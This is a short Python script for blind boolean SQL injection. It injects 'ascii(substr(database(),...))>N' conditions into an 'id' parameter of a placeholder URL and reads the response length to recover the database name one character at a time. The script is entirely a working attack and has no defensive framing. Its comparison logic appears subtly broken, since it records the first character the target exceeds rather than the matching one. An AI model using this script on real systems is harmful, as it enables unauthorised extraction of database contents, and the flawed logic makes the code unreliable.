import requests
def get_db_name():
 result = ""
 url_template = "url?id=2' and ascii(substr(database(),{0},1))>{1} %23"
 chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 for i in range(1,9):
  for char in chars:
   char_ascii = ord(char)
   url = url_template.format(i,char_ascii)
   response = requests.get(url)
   length = len(response.text)
   #根据返回长度的不同来判断字符正确与否
   if length>706:
    result += char
    break
 print(result)
